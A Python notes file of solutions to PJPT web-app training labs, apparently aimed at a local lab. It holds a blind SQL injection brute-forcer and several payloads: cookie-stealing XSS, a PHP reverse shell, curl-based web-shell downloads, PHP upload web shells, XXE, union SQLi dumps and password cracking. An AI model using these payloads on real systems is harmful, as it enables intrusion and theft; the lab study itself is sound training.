# Notes/solutions to the pjpt webapp labs

import requests
import re
import urllib.parse

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
headers = {'content-type': 'application/x-www-form-urlencoded'}
url = 'http://127.0.0.1'

def injection0x03():
    password = ''
    print("\nBrute forcing the password.\n")
    for i in range(1,32):
        for j in characters:
            uri = ''.join([url,'/labs/i0x03.php'])
            payload = f"product=Senpai+Knife+Set' and substring((select password from injection0x03_users),{i},1)='{j}'#"
            r = requests.post(uri, data=payload, headers=headers)

            s = 'The Senpai Knife Set is the ideal choice for those who seek perfection'
            response_check = re.search(s, r.text)

            if (str(response_check) != 'None'): 
                password += str(j)
                print(f'Length: {len(password)}, Password: {password}')
                break

    print(f"\nFinished the password is: {password}\n")

#XSS0x01
# <img src=x onerror="prompt(1)">
# <img src=x onerror="window.location.href = 'http://127.0.0.1/index.php'">
# XSS0x02
# <script>prompt(1)</script>
# <script>alert(document.cookie)</script>
#XSS0x03
# <img src=x onerror=this.src="http://192.168.2.69:8081/?"+document.cookie;>
# GET /?admin_cookie=5ac5355b84894ede056ab81b324c4675 HTTP/1.1
#c0x01
# localhost 1>/dev/null; whoami #
# ; php -r '$sock=fsockopen("192.168.2.50",7777);exec("bash <&3 >&3 2>&3");' ; asd
#c0x02
# https://webhook.site/051ac6a6-68fa-444c-9bad-7d9bc85befc8?`whoami`
# https://webhook.site/051ac6a6-68fa-444c-9bad-7d9bc85befc8 \n wget http://192.168.2.50:8080/test
# https://tcm-sec.com && curl http://192.168.2.69:8081/revshell.php > /var/www/html/revshell.php
# head to localhost/revshell.php for shell
#c0x03
# executes: awk 'BEGIN {print sqrt(((100-POSITIONX)^2) + ((200-POSITIONY)^2))}'
# ASH 100 400)^2))}' \n whoami #
# 400)^2))}';whoami #
# ASH 100 400)^2))}' ; curl http://192.168.2.69:8081/test #
# 400)^2))}' ; curl http://192.168.2.69:8081/`pwd` #
# 400)^2))}' ; curl http://192.168.2.69:8081/c0x03shell.php > /var/www/html/c0x03shell.php #
# head to localhost/c0x03shell.php for a shell
#f0x01
# intercept request, change name
# Content-Disposition: form-data; name="uploaded_file"; filename="f0x01shell.php"
# fuzz for directory it's placed, see uploads
# http://192.168.2.50/labs/uploads/f0x01shell.php
#f0x02
# upload png, add payload in png text, change extension
# <?php system($_GET['cmd']); ?>
# Content-Disposition: form-data; name="uploaded_file"; filename="f0x02cmdexe6.php"
# http://192.168.2.50/labs/uploads/f0x02cmdexe6.php?cmd=whoami
# be sure to shell out some png stuff but need
# keep some magic bytes at the beginning to denote a PNG file
#f0x03
# Content-Disposition: form-data; name="uploaded_file"; filename="f0x03cmd.phar"
# phar doesnt work, try others:
# Content-Disposition: form-data; name="uploaded_file"; filename="f0x03cmd2.phtml"
# http://192.168.2.50/labs/uploads/f0x03cmd2.phtml?cmd=id
# seems phtml is the only one that works for php
#a0x01
# brute force password is letmein for jeremy
# can FUZZ password with request and fuff
# ffuf -u http://192.168.2.50/labs/a0x01.php -request-proto http -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=jeremy&password=FUZZ" -w wordlist -fs 1814
#a0x02
# intercept reuqest to send mfa, change username to jeremy
#a0x03
# ffuf -u http://192.168.2.50/labs/a0x03.php -request-proto http -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZUSER&password=FUZZPASS" -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w a0x03pass.txt:FUZZPASS -fs 3256,3356
# clusterbomb
#e0x01
# <!DOCTYPE foo [<!ENTITY ext SYSTEM "http://192.168.2.50:8080/e0x02.dtd">]>
# <creds><user>epic</user><foo>&ext;</foo><password>epic</password></creds>
# file works with php too
#e0x02
# http://192.168.2.50/labs/e0x02.php?account=1003
# change id to see other details

def e0x02_admin_finder():
    admins = []
    s = 'Type: admin'
    for i in range(0,2000):
        uri = ''.join([url, '/labs/e0x02.php?account=', str(i)])
        r = requests.get(uri)
        if len(r.text) != 849:
            admin_check = re.search(s, r.text)
            if (str(admin_check) != 'None'):
                #print(f'{i}: {admin_check}')
                admins.append(i)
    print(admins)

#capstone
# reflected XSS http://192.168.2.50/capstone/index.php?message=%3Cscript%3Eprompt(1)%3C/script%3E
# reflected XSS http://192.168.2.50/capstone/index.php?message=%3Cscript%3Ealert(document.cookie)%3C/script%3E
# PHPSESSID=c66b521649c8107108d7cb4f5ba6c1c7
# Stored XSS 'Add rating' function
# can prompt users
# 
# SQLi http://192.168.2.50/capstone/coffee.php?coffee=1%27
# 1' and '1'='2 gives negative result
# 1' and '1'='1 gives positive
# 1' and substring((select version()),1,1)='8     succeeds
# sqlmap -r coffee.req --dump
# awk 'BEGIN{FS=OFS=" "}{$1=$6;$2=$3=$4=$5=$6=$7=$8=$9="";print}' user_table.txt > user_table.john
# turns table pasted output into hash for john, the $# represent the elements after being split of spaces
# john --format=bcrypt --wordlist=/opt/wordlists/rockyou.txt user_table.john
# jeremy:captain1
# 
# manual
# http://192.168.2.50/capstone/coffee.php?coffee=3%27%20union%20select%20null,null,null,null,null,null,null--%20-
# http://192.168.2.50/capstone/coffee.php?coffee=3%27%20union%20select%20null,table_name,null,null,null,null,null%20from%20information_schema.tables--%20-
# to view tables, users is the one i want
# 2nd field is coffee name
# 3rd field is region
# can export both username and password with the below:
# http://192.168.2.50/capstone/coffee.php?coffee=3%27%20union%20select%20null,username,password,null,null,null,null%20from%20users--%20-
# 
# upload file vuln in admin portal
# keep magic bytes and add 
# <?php system($_GET['cmd']); ?>
# http://192.168.2.50/capstone/assets/19.phtml?cmd=id
# 


if __name__ == '__main__':
    #injection0x03()
    e0x02_admin_finder()
